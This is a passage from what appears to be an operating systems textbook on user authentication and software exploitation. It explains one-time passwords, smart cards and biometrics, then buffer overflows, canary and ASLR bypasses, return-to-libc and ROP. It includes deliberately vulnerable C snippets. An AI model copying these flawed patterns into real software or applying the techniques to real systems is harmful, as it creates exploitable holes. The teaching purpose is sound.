For additional security, modern versions of UNIX typically store the encrypted passwords in a separate “shadow” file that, unlike the password file, is only readable by root. The combination of salting the password file and making it unreadable except indirectly (and slowly) can generally withstand most attacks on it.

## One-Time Passwords

Most superusers exhort their mortal users to change their passwords once a month. It falls on deaf ears. Even more extreme is changing the password with every login, leading to one-time passwords. When one-time passwords are used, the user gets a book containing a list of passwords. Each login uses the next password in the list. If an intruder ever discovers a password, it will not do him any good, since next time a different password must be used. It is suggested that the user try to avoid losing the password book.

Actually, a book is not needed due to an elegant scheme devised by Leslie Lamport that allows a user to log in securely over an insecure network using onetime passwords (Lamport, 1981). Lamport’s method can be used to allow a user running on a home PC to log in to a server over the Internet, even though intruders may see and copy down all the traffic in both directions. Furthermore, no secrets have to be stored in the file system of either the server or the user’s PC. The method is sometimes called a one-way hash chain.

The algorithm is based on a one-way function, that is, a function $y=f(x)$ that has the property that given $x$ it is easy to find $y$, but given $y$ it is computationally infeasible to find $x$. The input and output should be the same length, for example, 256 bits.

The user picks a secret password that he memorizes. He also picks an integer, $n$, which is how many one-time passwords the algorithm is able to generate. As an example, consider $n=4$, although in practice a much larger value of $n$ would be used. If the secret password is $s$, the first password is given by running the oneway function $n$ times:

$$
P_{1}=f(f(f(f(s))))
$$

The second password is given by running the one-way function $n-1$ times:

$$
P_{2}=f(f(f(s)))
$$

The third password runs $f$ twice and the fourth password runs it once. In general, $P_{i-1}=f\left(P_{i}\right)$. The key fact to note here is that given any password in the sequence, it is easy to compute the previous one in the numerical sequence but impossible to compute the next one. For example, given $P_{2}$ it is easy to find $P_{1}$ but impossible to find $P_{3}$.

The server is initialized with $P_{0}$, which is just $f\left(P_{1}\right)$. This value is stored in the password file entry associated with the user’s login name along with the integer 1, indicating that the next password required is $P_{1}$. When the user wants to log in for the first time, he sends his login name to the server, which responds by sending the integer in the password file, 1. The user’s machine responds with $P_{1}$, which can be computed locally from $s$, which is typed in on the spot. The server then computes $f\left(P_{1}\right)$ and compares this to the value stored in the password file $\left(P_{0}\right)$. If the values match, the login is permitted, the integer is incremented to 2, and $P_{1}$ overwrites $P_{0}$ in the password file.

On the next login, the server sends the user a 2 , and the user’s machine computes $P_{2}$. The server then computes $f\left(P_{2}\right)$ and compares it to the entry in the password file. If the values match, the login is permitted, the integer is incremented to 3 , and $P_{2}$ overwrites $P_{1}$ in the password file. The property that makes this scheme work is that even though an intruder may capture $P_{i}$, he has no way to compute $P_{i+1}$ from it, only $P_{i-1}$ which has already been used and is now worthless. When all $n$ passwords have been used up, the server is reinitialized with a new secret key.

## Challenge-Response Authentication

A variation on the password idea is to have each new user provide a long list of questions and answers that are then stored on the server securely (e.g., in encrypted form). The questions should be chosen so that the user does not need to write them down. Possible questions that could be asked are:

1. Who is Marjolein’s sister?
2. On what street was your elementary school?
3. What did Mrs. Ellis teach?

At login, the server asks one of them at random and checks the answer. To make this scheme practical, though, many question-answer pairs would be needed.

Another variation is challenge-response. When this is used, the user picks an algorithm when signing up as a user, for example $x^{2}$. When the user logs in, the server sends the user an argument, say 7 , in which case the user types 49. The algorithm can be different in the morning and afternoon, on different days of the week, and so on.

If the user’s device has real computing power, such as a personal computer, a personal digital assistant, or a cell phone, a more powerful form of challenge-response can be used. In advance, the user selects a secret key, $k$, which is initially brought to the server system by hand. A copy is also kept (securely) on the user’s computer. At login time, the server sends a random number, $r$, to the user’s computer, which then computes $f(r, k)$ and sends that back, where $f$ is a publicly known function. The server then does the computation itself and checks if the result sent back agrees with the computation. The advantage of this scheme over a password is that even if a wiretapper sees and records all the traffic in both directions, he will learn nothing that helps him next time. Of course, the function, $f$, has to be complicated enough that $k$ cannot be deduced, even given a large set of observations. Cryptographic hash functions are good choices, with the argument being the XOR of $r$ and $k$. These functions are known to be hard to reverse.

### 9.6.1 Authentication Using a Physical Object

The second method for authenticating users is to check for some physical object they have rather than something they know. Metal door keys have been used for centuries for this purpose. Nowadays, the physical object used is often a plastic card that is inserted into a reader associated with the computer. Normally, the user must not only insert the card, but must also type in a password, to prevent someone from using a lost or stolen card. Viewed this way, using a bank’s ATM (Automated Teller Machine) starts out with the user logging in to the bank’s computer via a remote terminal (the ATM machine) using a plastic card and a password (currently a 4-digit PIN code in most countries, but this is just to avoid the expense of putting a full keyboard on the ATM machine).

Information-bearing plastic cards come in two varieties: magnetic stripe cards and chip cards. Magnetic stripe cards hold about 140 bytes of information written on a piece of magnetic tape glued to the back of the card. This information can be read out by the terminal and then sent to a central computer. Often the information
contains the user’s password (e.g., PIN code) so the terminal can perform an identity check even if the link to the main computer is down. Typically the password is encrypted by a key known only to the bank. These cards cost about $0.10 to $0.50, depending on whether there is a hologram sticker on the front and the production volume. As a way to identify users in general, magnetic stripe cards are risky because the equipment to read and write them is cheap and widespread.

Chip cards contain a tiny integrated circuit (chip) on them. These cards can be subdivided into two categories: stored value cards and smart cards. Stored value cards contain a small amount of memory (usually less than 1 KB) using ROM technology to allow the value to be remembered when the card is removed from the reader and thus the power turned off. There is no CPU on the card, so the value stored must be changed by an external CPU (in the reader). These cards are mass produced by the millions for well under $1 and are used, for example, as prepaid telephone cards. When a call is made, the telephone just decrements the value in the card, but no money actually changes hands. For this reason, these cards are generally issued by one company for use on only its machines (e.g., telephones or vending machines). They could be used for login authentication by storing a 1-KB password in them that the reader would send to the central computer, but this is rarely done.

However, nowadays, much security work is being focused on the smart cards which currently have something like a 4-MHz 8-bit CPU, 16 KB of ROM, 4 KB of ROM, 512 bytes of scratch RAM, and a 9600-bps communication channel to the reader. The cards are getting smarter in time, but are constrained in a variety of ways, including the depth of the chip (because it is embedded in the card), the width of the chip (so it does not break when the user flexes the card) and the cost (typically $1 to $20, depending on the CPU power, memory size, and presence or absence of a cryptographic coprocessor).

Smart cards can be used to hold money, as do stored value cards, but with much better security and universality. The cards can be loaded with money at an ATM machine or at home over the telephone using a special reader supplied by the bank. When inserted into a merchant’s reader, the user can authorize the card to deduct a certain amount of money from the card (by typing YES), causing the card to send a little encrypted message to the merchant. The merchant can later turn the message over to a bank to be credited for the amount paid.

The big advantage of smart cards over, say, credit or debit cards, is that they do not need an online connection to a bank. If you do not believe this is an advantage, try the following experiment. Try to buy a single candy bar at a store and insist on paying with a credit card. If the merchant objects, say you have no cash with you and besides, you need the frequent flyer miles. You will discover that the merchant is not enthusiastic about the idea (because the associated costs dwarf the profit on the item). This makes smart cards useful for small store purchases, parking meters, vending machines, and many other devices that normally require coins. They are in widespread use in Europe and spreading elsewhere.

Smart cards have many other potentially valuable uses (e.g., encoding the bearer’s allergies and other medical conditions in a secure way for use in emergencies), but this is not the place to tell that story. Our interest here is how they can be used for secure login authentication. The basic concept is simple: a smart card is a small, tamperproof computer that can engage in a discussion (protocol) with a central computer to authenticate the user. For example, a user wishing to buy things at an e-commerce Website could insert a smart card into a home reader attached to his PC. The e-commerce site would not only use the smart card to authenticate the user in a more secure way than a password, but could also deduct the purchase price from the smart card directly, eliminating a great deal of the overhead (and risk) associated with using a credit card for online purchases.

Various authentication schemes can be used with a smart card. A particularly simple challenge-response works like this. The server sends a 512-bit random number to the smart card, which then adds the user’s 512-bit password stored in the card’s ROM to it. The sum is then squared and the middle 512 bits are sent back to the server, which knows the user’s password and can compute whether the result is correct or not. The sequence is shown in Fig. 9-19. If a wiretapper sees both messages, he will not be able to make much sense out of them, and recording them for future use is pointless because on the next login, a different 512-bit random number will be sent. Of course, a much fancier algorithm than squaring can be used, and always is.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-096_515_1155_1162_190.jpg)

Figure 9-19. Use of a smart card for authentication.

One disadvantage of any fixed cryptographic protocol is that over the course of time it could be broken, rendering the smart card useless. One way to avoid this fate is to use the ROM on the card not for a cryptographic protocol, but for a Java interpreter. The real cryptographic protocol is then downloaded onto the card as a Java binary program and run interpretively. In this way, as soon as one protocol is broken, a new one can be installed worldwide in a straightforward way: next time
the card is used, new software is installed on it. A disadvantage of this approach is that it makes an already slow card even slower, but as technology improves, this method is very flexible. Another disadvantage of smart cards is that a lost or stolen one may be subject to a side-channel attack, for example a power analysis attack. By observing the electric power consumed during repeated encryption operations, an expert with the right equipment may be able to deduce the key. Measuring the time to encrypt with various specially chosen keys may also provide valuable information about the key.

### 9.6.2 Authentication Using Biometrics

The third authentication method measures physical characteristics of the user that are hard to forge. These are called biometrics (Boulgouris et al., 2010; and Campisi, 2013). For example, a fingerprint or voiceprint reader hooked up to the computer could verify the user’s identity.

A typical biometrics system has two parts: enrollment and identification. During enrollment, the user’s characteristics are measured and the results digitized. Then significant features are extracted and stored in a record associated with the user. The record can be kept in a central database (e.g., for logging in to a remote computer), or stored on a smart card that the user carries around and inserts into a remote reader (e.g., at an ATM machine).

The other part is identification. The user shows up and provides a login name. Then the system makes the measurement again. If the new values match the ones sampled at enrollment time, the login is accepted; otherwise it is rejected. The login name is needed because the measurements are never exact, so it is difficult to index them and then search the index. Also, two people might have the same characteristics, so requiring the measured characteristics to match those of a specific user is stronger than just requiring them to match those of any user.

The characteristic chosen should have enough variability that the system can distinguish among many people without error. For example, hair color is not a good indicator because too many people share the same color. Also, the characteristic should not vary over time and with some people, hair color does not have this property. Similarly a person’s voice may be different due to a cold and a face may look different due to a beard or makeup not present at enrollment time. Since later samples are never going to match the enrollment values exactly, the system designers have to decide how good the match has to be to be accepted. In particular, they have to decide whether it is worse to reject a legitimate user once in a while or let an imposter get in once in a while. An e-commerce site might decide that rejecting a loyal customer might be worse than accepting a small amount of fraud, whereas a nuclear weapons site might decide that refusing access to a genuine employee was better than letting random strangers in twice a year.

Now let us take a brief look at some of the biometrics that are in actual use. Finger-length analysis is surprisingly practical. When this is used, each computer
has a device like the one of Fig. 9-20. The user inserts his hand into it, and the length of all his fingers is measured and checked against the database.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-098_739_752_327_391.jpg)

Figure 9-20. A device for measuring finger length.

Finger-length measurements are not perfect, however. The system can be attacked with hand molds made out of plaster of Paris or some other material, possibly with adjustable fingers to allow some experimentation.

Another biometric that is in widespread commercial use is iris recognition. No two people have the same patterns (even identical twins), so iris recognition is as good as fingerprint recognition and more easily automated (Daugman, 2004). The subject just looks at a camera (at a distance of up to 1 meter), which photographs the subject’s eyes, extracts certain characteristics by performing what is called a gabor wavelet transformation, and compresses the results to 256 bytes. This string is compared to the value obtained at enrollment time, and if the Hamming distance is below some critical threshold, the person is authenticated. (The Hamming distance between two bit strings is the minimum number of changes needed to transform one into the other.)

Any technique that relies on images is subject to spoofing. For example, a person could approach the equipment (say, an ATM machine camera) wearing dark glasses to which photographs of someone else’s eyes were attached. After all, if the ATM’s camera can take a good iris photo at 1 meter, other people can do it too, and at greater distances using telephoto lenses. For this reason, countermeasures may be needed such as having the camera fire a flash, not for illumination purposes, but to see if the pupil contracts in response or to see if the amateur photographer’s dreaded red-eye effect shows up in the flash picture but is absent when no flash is
used. Amsterdam Airport has been using iris recognition technology since 2001 to enable frequent travelers to bypass the normal immigration line.

A somewhat different technique is signature analysis. The user signs his name with a special pen connected to the computer, and the computer compares it to a known specimen stored online or on a smart card. Even better is not to compare the signature, but compare the pen motions and pressure made while writing it. A good forger may be able to copy the signature, but will not have a clue as to the exact order in which the strokes were made or at what speed and what pressure.

A scheme that relies on minimal special hardware is voice biometrics (Kaman et al., 2013). All that is needed is a microphone (or even a telephone); the rest is software. In contrast to voice recognition systems, which try to determine what the speaker is saying, these systems try to determine who the speaker is. Some systems just require the user to say a secret password, but these can be defeated by an eavesdropper who can record passwords and play them back later. More advanced systems say something to the user and ask that it be repeated back, with different texts used for each login. Some companies are starting to use voice identification for applications such as home shopping over the telephone because voice identification is less subject to fraud than using a PIN code for identification. Voice recognition can be combined with other biometrics such as face recognition for better accuracy (Tresadern et al., 2013).

We could go on and on with more examples, but two more will help make an important point. Cats and other animals mark off their territory by urinating around its perimeter. Apparently cats can identify each other’s smell this way. Suppose that someone comes up with a tiny device capable of doing an instant urinalysis, thereby providing a foolproof identification. Each computer could be equipped with one of these devices, along with a discreet sign reading: “For login, please deposit sample here.” This might be an absolutely unbreakable system, but it would probably have a fairly serious user acceptance problem.

When the above paragraph was included in an earlier edition of this book, it was intended at least partly as a joke. No more. In an example of life imitating art (life imitating textbooks?), researchers have now developed odor-recognition systems that could be used as biometrics (Rodriguez-Lujan et al., 2013). Is Smell-O-Vision next?

Also potentially problematical is a system consisting of a thumbtack and a small spectrograph. The user would be requested to press his thumb against the thumbtack, thus extracting a drop of blood for spectrographic analysis. So far, nobody has published anything on this, but there is work on blood vessel imaging as a biometric (Fuksis et al., 2011).

Our point is that any authentication scheme must be psychologically acceptable to the user community. Finger-length measurements probably will not cause any problem, but even something as nonintrusive as storing fingerprints on line may be unacceptable to many people because they associate fingerprints with criminals. Nevertheless, Apple introduced the technology on the iPhone 5S.

### 9.7 EXPLOITING SOFTWARE

One of the main ways to break into a user’s computer is by exploiting vulnerabilities in the software running on the system to make it do something different than the programmer intended. For instance, a common attack is to infect a user’s browser by means of a drive-by-download. In this attack, the cybercriminal infects the user’s browser by placing malicious content on a Web server. As soon as the user visits the Website, the browser is infected. Sometimes, the Web servers are completely run by the attackers, in which case the attackers should find a way to lure users to their Web site (spamming people with promises of free software or movies might do the trick). However, it is also possible that attackers are able to put malicious content on a legitimate Website (perhaps in the ads, or on a discussion board). Not so long ago, the Website of the Miami Dolphins was compromised in this way, just days before the Dolphins hosted the Super Bowl, one of the most anticipated sporting events of the year. Just days before the event, the Website was extremely popular and many users visiting the Website were infected. After the initial infection in a drive-by-download, the attacker’s code running in the browser downloads the real zombie software (malware), executes it, and makes sure it is always started when the system boots.

Since this is a book on operating systems, the focus is on how to subvert the operating system. The many ways one can exploit software bugs to attack Websites and data bases are not covered here. The typical scenario is that somebody discovers a bug in the operating system and then finds a way to exploit it to compromise computers that are running the defective code. Drive-by-downloads are not really part of the picture either, but we will see that many of the vulnerabilities and exploits in user applications are applicable to the kernel also.

In Lewis Caroll’s famous book Through the Looking Glass, the Red Queen takes Alice on a crazy run. They run as fast as they can, but no matter how fast they run, they always stay in the same place. That is odd, thinks Alice, and she says so. “In our country you’d generally get to somewhere else-if you ran very fast for a long time as we’ve been doing.” “A slow sort of country!” said the Queen. “Now, here, you see, it takes all the running you can do, to keep in the same place. If you want to get somewhere else, you must run at least twice as fast as that!”

The Red Queen effect is typical for evolutionary arms races. In the course of millions of years, the ancestors of zebras and lions both evolved. Zebras became faster and better at seeing, hearing and smelling predators-useful, if you want to outrun the lions. But in the meantime, lions also became faster, bigger, stealthier and better camouflaged-useful, if you like zebra. So, although the lion and the zebra both “improved” their designs, neither became more successful at beating the other in the hunt; both of them still exist in the wild. Still, lions and zebras are locked in an arms race. They are running to stand still. The Red Queen effect also applies to program exploitation. Attacks become ever more sophisticated to deal with increasingly advanced security measures.

Although every exploit involves a specific bug in a specific program, there are several general categories of bugs that occur over and over and are worth studying to see how attacks work. In the following sections we will examine not only a number of these methods, but also countermeasures to stop them, and counter countermeasures to evade these measures, and even some counter counter countermeasures to counter these tricks, and so on. It will give you a good idea of the arms race between attackers and defenders-and what it is like to go jogging with the Red Queen.

We will start our discussion with the venerable buffer overflow, one of the most important exploitation techniques in the history of computer security. It was already used in the very first Internet worm, written by Robert Morris Jr. in 1988, and it is still widely used today. Despite all counter measures, researchers predict that buffer overflows will be with us for quite some time yet (Van der Veen, 2012). Buffer overflows are ideally suited for introducing three of the most important protection mechanisms available in most modern systems: stack canaries, data execution protection, and address-space layout randomization. After that, we will look at other exploitation techniques, like format string attacks, integer overflows, and dangling pointer exploits. So, get ready and put your black hat on!

### 9.7.1 Buffer Overflow Attacks

One rich source of attacks has been due to the fact that virtually all operating systems and most systems programs are written in the C or C++ programming languages (because programmers like them and they can be compiled to extremely efficient object code). Unfortunately, no C or C++ compiler does array bounds checking. As an example, the C library function gets, which reads a string (of unknown size) into a fixed-size buffer, but without checking for overflow, is notorious for being subject to this kind of attack (some compilers even detect the use of gets and warn about it). Consequently, the following code sequence is also not checked:

```
void A() {
    char B[128]; /* reserve a buffer with space for 128 bytes on the stack */
    printf ("Type log message:");
    gets (B); /* read log message from standard input into buffer */
    writeLog (B); /* output the string in a pretty format to the log file */
}
```

Function $A$ represents a logging procedure-somewhat simplified. Every time the function executes, it invites the user to type in a log message and then reads whatever the user types in the buffer $B$, using the gets from the C library. Finally, it calls the (homegrown) writeLog function that presumably writes out the log entry in an attractive format (perhaps adding a date and time to the log message to make
it easier to search the log later). Assume that function $A$ is part of a privileged process, for instance a program that is SETUID root. An attacker who is able to take control of such a process, essentially has root privileges himself.

The code above has a severe bug, although it may not be immediately obvious. The problem is caused by the fact that gets reads characters from standard input until it encounters a newline character. It has no idea that buffer $B$ can hold only 128 bytes. Suppose the user types a line of 256 characters. What happens to the remaining 128 bytes? Since gets does not check for buffer bounds violations, the remaining bytes will be stored on the stack also, as if the buffer were 256 bytes long. Everything that was originally stored at these memory locations is simply overwritten. The consequences are typically disastrous.

In Fig. 9-21(a), we see the main program running, with its local variables on the stack. At some point it calls the procedure $A$, as shown in Fig. 9-21(b). The standard calling sequence starts out by pushing the return address (which points to the instruction following the call) onto the stack. It then transfers control to $A$, which decrements the stack pointer by 128 to allocate storage for its local variable (buffer B).

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-102_618_1220_984_125.jpg)

Figure 9-21. (a) Situation when the main program is running. (b) After the procedure

$A$

has been called. (c) Buffer overflow shown in gray.

So what exactly will happen if the user provides more than 128 characters? Figure 9-21(c) shows this situation. As mentioned, the gets function copies all the bytes into and beyond the buffer, overwriting possibly many things on the stack, but in particular overwriting the return address pushed there earlier. In other words, part of the log entry now fills the memory location that the system assumes to hold the address of the instruction to jump to when the function returns. As long as the user typed in a regular log message, the characters of the message would probably
not represent a valid code address. As soon as the function $A$ returns, the progam would try to jump to an invalid target-something the system would not like at all. In most cases, the program would crash immediately.

Now assume that this is not a benign user who provides an overly long message by mistake, but an attacker who provides a tailored messsage specifically aimed at subverting the program’s control flow. Say the attacker provides an input that is carefully crafted to overwrite the return address with the address of buffer $B$. The result is that upon returning from function $A$, the program will jump to the beginning of buffer $B$ and execute the bytes in the buffer as code. Since the attacker controls the content of the buffer, he can fill it with machine instructions-to execute the attacker’s code within the context of the original program. In effect, the attacker has overwritten memory with his own code and gotten it executed. The program is now completely under the attacker’s control. He can make it do whatever he wants. Often, the attacker code is used to launch a shell (for instance by means of the exec system call), enabling the intruder convenient access to the machine. For this reason, such code is commonly known as shellcode, even if it does not spawn a shell.

This trick works not just for programs using gets (although you should really avoid using that function), but for any code that copies user-provided data in a buffer without checking for boundary violations. This user data may consist of command-line parameters, environment strings, data sent over a network connection, or data read from a user file. There are many functions that copy or move such data: strcpy, memcpy, strcat, and many others. Of course, any old loop that you write yourself and that moves bytes into a buffer may be vulnerable as well.

What if the attacker does not know the exact address to return to? Often an attacker can guess where the shellcode resides approximately, but not exactly. In that case, a typical solution is to prepend the shellcode with a nop sled: a sequence of one-byte NO OPERATION instructions that do not do anything at all. As long as the attacker manages to land anywhere on the nop sled, the execution will eventually also reach the real shellcode at the end. Nop sleds work on the stack, but also on the heap. On the heap, attackers often try to increase their chances by placing nop sleds and shellcode all over the heap. For instance, in a browser, malicious JavaScript code may try to allocate as much memory as it can and fill it with a long nop sled and a small amount of shellcode. Then, if the attacker manages to divert the control flow and aims for a random heap address, chances are that he will hit the nop sled. This technique is known as heap spraying.

## Stack Canaries

One commonly used defense against the attack sketched above is to use stack canaries. The name derives from the mining profession. Working in a mine is dangerous work. Toxic gases like carbon monoxide may build up and killl the miners. Moreover, carbon monoxide is odorless, so the miners might not even notice it.

In the past, miners therefore brought canaries into the mine as early warning systems. Any build up of toxic gases would kill the canary before harming its owner. If your bird died, it was probably time to go up.

Modern computer systems still use (digital) canaries as early warning systems. The idea is very simple. At places where the program makes a function call, the compiler inserts code to save a random canary value on the stack, just below the return address. Upon a return from the function, the compiler inserts code to check the value of the canary. If the value changed, something is wrong. In that case, it is better to hit the panic button and crash rather than continuing.

## Avoiding Stack Canaries

Canaries work well against attacks like the one above, but many buffer overflows are still possible. For instance, consider the code snippet in Fig. 9-22. It uses two new functions. The strcpy is a C library function to copy a string into a buffer, while the strlen determines the length of a string.

```
void A (char *date) {
    int len;
    char B [128];
    char logMsg [256];
    strcpy (logMsg, date); /* first copy the string with the date in the log message */
    len = strlen (date); /* determine how many characters are in the date string */
    gets (B); /* now get the actual message */
    strcpy (logMsg+len, B); /* and copy it after the date into logMessage */
    writeLog (logMsg); /* finally, write the log message to disk */
}
```

Figure 9-22. Skipping the stack canary: by modifying len first, the attack is able to bypass the canary and modify the return address directly.

As in the previous example, function $A$ reads a log message from standard input, but this time it explicitly prepends it with the current date (provided as a string argument to function $A$ ). First, it copies the date into the log message (line 6). A date string may have different length, depending on the day of the week, the month, etc. For instance, Friday has 5 letters, but Saturday 8. Same thing for the months. So, the second thing it does, is determine how many characters are in the date string (line 7). Then it gets the user input (line 5) and copies it into the log message, starting just after the date string. It does this by specifying that the destination of the copy should be the start of the log message plus the length of the date string (line 9). Finally, it writes the log to disk as before.

Let us suppose the system uses stack canaries. How could we possibly change the return address? The trick is that when the attacker overflows buffer $B$, he does not try to hit the return address immediately. Instead, he modifies the variable len that is located just above it on the stack. In line 9, len serves as an offset that determines where the contents of buffer $B$ will be written. The programmer’s idea was to skip only the date string, but since the attacker controls len, he may use it to skip the canary and overwrite the return address.

Moreover, buffer overflows are not limited to the return address. Any function pointer that is reachable via an overflow is fair game. A function pointer is just like a regular pointer, except that it points to a function instead of data. For instance, C and C++ allow a programmer to declare a variable $f$ as a pointer to a function that takes a string argument and returns no result, as follows:

```
void (*f)(char*);
```

The syntax is perhaps a bit arcane, but it is really just another variable declaration. Since function $A$ of the previous example matches the above signature, we can now write ” $f=A$ ” and use $f$ instead of $A$ in our program. It is beyond this book to go into function pointers in great detail, but rest assured that function pointers are quite common in operating systems. Now suppose the attacker manages to overwrite a function pointer. As soon as the program calls the function using the function pointer, it would really call the code injected by the attacker. For the exploit to work, the function pointer need not even be on the stack. Function pointers on the heap are just as useful. As long as the attacker can change the value of a function pointer or a return address to the buffer that contains the attacker’s code, he is able to change the program’s flow of control.

## Data Execution Prevention

Perhaps by now you may exclaim: “Wait a minute! The real cause of the problem is not that the attacker is able to overwrite function pointers and return addresses, but the fact that he can inject code and have it executed. Why not make it impossible to execute bytes on the heap and the stack?” If so, you had an epiphany. However, we will see shortly that epiphanies do not always stop buffer overflow attacks. Still, the idea is pretty good. Code injection attacks will no longer work if the bytes provided by the attacker cannot be executed as legitimate code.

Modern CPUs have a feature that is popularly referred to as the NX bit, which stands for “No-eXecute.” It is extremely useful to distinguish between data segments (heap, stack, and global variables) and the text segment (which contains the code). Specifically, many modern operating systems try to ensure that data segments are writable, but are not executable, and the text segment is executable, but not writable. This policy is known on OpenBSD as $\mathbf{W}^{\wedge} \mathbf{X}$ (pronounced as “W Exclusive-OR X”) or “W XOR X”). It signifies that memory is either writable or executable, but not both. Mac OS X, Linux, and Windows have similar protection
schemes. A generic name for this security measure is DEP (Data Execution Prevention). Some hardware does not support the NX bit. In that case, DEP still works but the enforcement takes place in software.

DEP prevents all of the attacks discussed so far. The attacker can inject as much shellcode into the process as much as he wants. Unless he is able to make the memory executable, there is no way to run it.

## Code Reuse Attacks

DEP makes it impossible to execute code in a data region. Stack canaries make it harder (but not impossible) to overwrite return addresses and function pointers. Unfortunately, this is not the end of the story, because somewhere along the line, someone else had an epiphany too. The insight was roughly as follows: “Why inject code, when there is plenty of it in the binary already?” In other words, rather than introducing new code, the attacker simply constructs the necessary functionality out of the existing functions and instructions in the binaries and libraries. We will first look at the simplest of such attacks, return to libc, and then discuss the more complex, but very popular, technique of return-oriented programming.

Suppose that the buffer overflow of Fig. 9-22 has overwritten the return address of the current function, but cannot execute attacker-supplied code on the stack. The question is: can it return somewhere else? It turns out it can. Almost all C programs are linked with the (usually shared) library libc, which contains key functions most C programs need. One of these functions is system, which takes a string as argument and passes it to the shell for execution. Thus, using the system function, an attacker can execute any program he wants. So, instead of executing shellcode, the attacker simply place a string containing the command to execute on the stack, and diverts control to the system function via the return address.

The attack is known as return to libc and has several variants. System is not the only function that may be interesting to the attacker. For instance, attackers may also use the mprotect function to make part of the data segment executable. In addition, rather than jumping to the libc function directly, the attack may take a level of indirection. On Linux, for instance, the attacker may return to the PLT (Procedure Linkage Table) instead. The PLT is a structure to make dynamic linking easier, and contains snippets of code that, when executed, in turn call the dynamically linked library functions. Returning to this code then indirectly executes the library function.

The concept of ROP (Return-Oriented Programming) takes the idea of reusing the program’s code to its extreme. Rather than return to (the entry points of) library functions, the attacker can return to any instruction in the text segment. For instance, he can make the code land in the middle, rather than the beginning, of a function. The execution will simply continue at that point, one instruction at a time. Say that after a handful of instructions, the execution encounters another return instruction. Now, we ask the same question once again: where can we return
to? Since the attacker has control over the stack, he can again make the code return anywhere he wants to. Moreover, after he has done it twice, he may as well do it three times, or four, or ten, etc.

Thus, the trick of return-oriented programming is to look for small sequences of code that (a) do something useful, and (b) end with a return instruction. The attacker can string together these sequences by means of the return addresses he places on the stack. The individual snippets are called gadgets. Typically, they have very limited functionality, such as adding two registers, loading a value from memory into a register, or pushing a value on the stack. In other words, the collection of gadgets can be seen as a very strange instruction set that the attacker can use to build aribtary functionality by clever manipulation of the stack. The stack pointer, meanwhile, serves as a slightly bizarre kind of program counter.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-107_913_1285_764_125.jpg)

Figure 9-23. Return-oriented programming: linking gadgets.

Figure 9-23(a) shows an example of how gadgets are linked together by return addresses on the stack. The gadgets are short snippets of code that end with a return instruction. The return instruction will pop the address to return to off the stack and continue execution there. In this case, the attacker first returns to gadget $A$ in some function $X$, then to gadget $B$ in function $Y$, etc. It is the attacker’s job to gather these gadgets in an existing binary. As he did not create the gadgets himself, he sometimes has to make do with gadgets that are perhaps less than ideal, but
good enough for the job. For instance, Fig. 9-23(b) suggests that gadget A has a check as part of the instruction sequence. The attacker may not care for the check at all, but since it is there, he will have to accept it. For most purposes, it is perhaps good enough to pop any nonnegative number into register 1. The next gadget pops any stack value into register 2, and the third multiplies register 1 by 4, pushes it on the stack, and adds it to register 2. Combining, these three gadgets yields the attacker something that may be used to calculate the address of an element in an array of integers. The index into the array is provided by the first data value on the stack, while the base address of the array should be in the second data value.

Return-oriented programming may look very complicated, and perhaps it is. But as always, people have developed tools to automate as much as possible. Examples include gadget harvesters and even ROP compilers. Nowadays, ROP is one of the most important exploitation techniques used in the wild.

## Address-Space Layout Randomization

Here is another idea to stop these attacks. Besides modifying the return address and injecting some (ROP) program, the attacker should be able to return to exactly the right address-with ROP no nop sleds are possible. This is easy, if the addresses are fixed, but what if they are not? ASLR (Address Space Layout Randomization) aims to randomize the addresses of functions and data between every run of the program. As a result, it becomes much harder for the attacker to exploit the system. Specifically, ASLR often randomizes the positions of the initial stack, the heap, and the libraries.

Like canaries and DEP, many modern operating systems support ASLR, but often at different granularities. Most of them provide it for user applications, but only a few apply it consistently also to the operating system kernel itself (Giuffrida et al., 2012). The combined force of these three protection mechanisms has raised the bar for attackers significantly. Just jumping to injected code or even some existing function in memory has become hard work. Together, they form an important line of defense in modern operating systems. What is especially nice about them is that they offer their protection at a very reasonable cost to performance.

## Bypassing ASLR

Even with all three defenses enabled, attackers still manage to exploit the system. There are several weaknesses in ASLR that allow intruders to bypass it. The first weakness is that ASLR is often not random enough. Many implementations of ASLR still have certain code at fixed locations. Moreover, even if a segment is randomized, the randomization may be weak, so that an attacker can brute-force it. For instance, on 32-bit systems the entropy may be limited because you cannot randomize all bits of the stack. To keep the stack working as a regular stack that grows downward, randomizing the least significant bits is not an option.

A more important attack against ASLR is formed by memory disclosures. In this case, the attacker uses one vulnerability not to take control of the program directly, but rather to leak information abour the memory layout, which he can then use to exploit a second vulnerability. As a trivial example, consider the following code:

```
void C() {
    int index;
    int prime \([16]=\{1,2,3,5,7,11,13,17,19,23,29,31,37,41,43,47\} ;\)
    printf ("Which prime number between would you like to see?");
    index = read_user_input ();
    printf ("Prime number %d is: %d\n", index, prime[index]);
07. }
```

The code contains a call to read_user_input, which is not part of the standard C library. We simply assume that it exists and returns an integer that the user types on the command line. We also assume that it does not contain any errors. Even so, for this code it is very easy to leak information. All we need to do is provide an index that is greater than 15, or less than 0. As the program does not check the index, it will happily return the value of any integer in memory.

The address of one function is often sufficient for a successful attack. The reason is that even though the position at which a library is loaded may be randomized, the relative offset for each individual function from this position is generally fixed. Phrased differently: if you know one function, you know them all. Even if this is not the case, with just one code address, it is often easy to find many others, as shown by Snow et al. (2013).

## Noncontrol-Flow Diverting Attacks

So far, we have considered attacks on the control flow of a program: modifying function pointers and return addresses. The goal was always to make the program execute new functionality, even if that functionality was recycled from code already present in the binary. However, this is not the only possibility. The data itself can be an interesting target for the attacker also, as in the following snippet of pseudocode:

```
void A() {
    int authorized;
    char name [128];
    authorized = check_credentials (...); /* the attacker is not authorized, so returns 0 */
    printf ("What is your name?\n");
    gets (name);
    if (authorized != 0) {
        printf ("Welcome %s, here is all our secret dataln", name)
        /* ... show secret data ... */
```

```
} else
    printf ("Sorry %s, but you are not authorized.\n");
}
```

